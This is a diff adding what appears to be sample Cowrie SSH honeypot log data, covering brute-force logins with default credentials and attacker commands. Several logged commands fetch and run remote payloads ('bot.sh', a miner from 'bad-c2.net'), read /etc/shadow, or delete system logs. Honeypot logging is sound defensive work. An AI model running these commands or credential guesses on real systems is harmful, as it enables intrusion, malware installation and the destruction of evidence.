@@ -1,0 +1,25 @@
+{"eventid": "cowrie.session.connect", "src_ip": "185.220.101.5", "src_port": 49152, "dst_port": 22, "session": "a1b2c3d4", "timestamp": "2026-10-25T14:10:05.123456Z", "country": "Germany"}
+{"eventid": "cowrie.login.failed", "src_ip": "185.220.101.5", "username": "root", "password": "password", "session": "a1b2c3d4", "timestamp": "2026-10-25T14:10:07.456789Z", "country": "Germany"}
+{"eventid": "cowrie.login.failed", "src_ip": "185.220.101.5", "username": "admin", "password": "admin123", "session": "a1b2c3d4", "timestamp": "2026-10-25T14:10:09.789012Z", "country": "Germany"}
+{"eventid": "cowrie.login.success", "src_ip": "185.220.101.5", "username": "root", "password": "123456", "session": "a1b2c3d4", "timestamp": "2026-10-25T14:10:12.345678Z", "country": "Germany"}
+{"eventid": "cowrie.command.input", "src_ip": "185.220.101.5", "session": "a1b2c3d4", "input": "uname -a", "timestamp": "2026-10-25T14:10:15.987654Z", "country": "Germany"}
+{"eventid": "cowrie.command.input", "src_ip": "185.220.101.5", "session": "a1b2c3d4", "input": "cat /proc/cpuinfo", "timestamp": "2026-10-25T14:10:18.112233Z", "country": "Germany"}
+{"eventid": "cowrie.command.input", "src_ip": "185.220.101.5", "session": "a1b2c3d4", "input": "curl -O http://194.26.29.112/bot.sh && sh bot.sh", "timestamp": "2026-10-25T14:10:22.445566Z", "country": "Germany"}
+{"eventid": "cowrie.session.closed", "src_ip": "185.220.101.5", "session": "a1b2c3d4", "timestamp": "2026-10-25T14:10:25.778899Z", "country": "Germany"}
+{"eventid": "cowrie.session.connect", "src_ip": "45.155.205.233", "src_port": 52140, "dst_port": 22, "session": "e5f6g7h8", "timestamp": "2026-10-25T14:15:30.001122Z", "country": "Russia"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.205.233", "username": "support", "password": "support", "session": "e5f6g7h8", "timestamp": "2026-10-25T14:15:32.334455Z", "country": "Russia"}
+{"eventid": "cowrie.login.failed", "src_ip": "45.155.205.233", "username": "ubuntu", "password": "ubuntu", "session": "e5f6g7h8", "timestamp": "2026-10-25T14:15:35.667788Z", "country": "Russia"}
+{"eventid": "cowrie.login.success", "src_ip": "45.155.205.233", "username": "admin", "password": "password123", "session": "e5f6g7h8", "timestamp": "2026-10-25T14:15:39.990011Z", "country": "Russia"}
+{"eventid": "cowrie.command.input", "src_ip": "45.155.205.233", "session": "e5f6g7h8", "input": "id; whoami; w", "timestamp": "2026-10-25T14:15:42.223344Z", "country": "Russia"}
+{"eventid": "cowrie.command.input", "src_ip": "45.155.205.233", "session": "e5f6g7h8", "input": "cat /etc/shadow", "timestamp": "2026-10-25T14:15:45.556677Z", "country": "Russia"}
+{"eventid": "cowrie.command.input", "src_ip": "45.155.205.233", "session": "e5f6g7h8", "input": "wget http://bad-c2.net/miner -O /tmp/miner && chmod +x /tmp/miner", "timestamp": "2026-10-25T14:15:50.889900Z", "country": "Russia"}
+{"eventid": "cowrie.session.connect", "src_ip": "103.145.13.11", "src_port": 60234, "dst_port": 22, "session": "i9j0k1l2", "timestamp": "2026-10-25T14:22:10.123456Z", "country": "China"}
+{"eventid": "cowrie.login.failed", "src_ip": "103.145.13.11", "username": "cisco", "password": "cisco", "session": "i9j0k1l2", "timestamp": "2026-10-25T14:22:12.456789Z", "country": "China"}
+{"eventid": "cowrie.login.failed", "src_ip": "103.145.13.11", "username": "user", "password": "12345", "session": "i9j0k1l2", "timestamp": "2026-10-25T14:22:14.789012Z", "country": "China"}
+{"eventid": "cowrie.login.success", "src_ip": "103.145.13.11", "username": "root", "password": "root", "session": "i9j0k1l2", "timestamp": "2026-10-25T14:22:18.345678Z", "country": "China"}
+{"eventid": "cowrie.command.input", "src_ip": "103.145.13.11", "session": "i9j0k1l2", "input": "ps aux | grep miner", "timestamp": "2026-10-25T14:22:21.987654Z", "country": "China"}
+{"eventid": "cowrie.command.input", "src_ip": "103.145.13.11", "session": "i9j0k1l2", "input": "rm -rf /var/log/*", "timestamp": "2026-10-25T14:22:25.112233Z", "country": "China"}
+{"eventid": "cowrie.login.failed", "src_ip": "89.248.163.64", "username": "root", "password": "admin", "session": "sim_1792941407", "timestamp": "2026-10-25T15:16:47.370946Z", "country": "Seychelles"}
+{"eventid": "cowrie.login.failed", "src_ip": "89.248.163.64", "username": "root", "password": "root", "session": "sim_1792941407", "timestamp": "2026-10-25T15:16:47.370946Z", "country": "Seychelles"}
+{"eventid": "cowrie.login.failed", "src_ip": "89.248.163.64", "username": "root", "password": "toor", "session": "sim_1792941407", "timestamp": "2026-10-25T15:16:47.370946Z", "country": "Seychelles"}
+{"eventid": "cowrie.login.success", "src_ip": "89.248.163.64", "username": "root", "password": "toor", "session": "sim_1792941407", "timestamp": "2026-10-25T15:16:47.370946Z", "country": "Seychelles"}
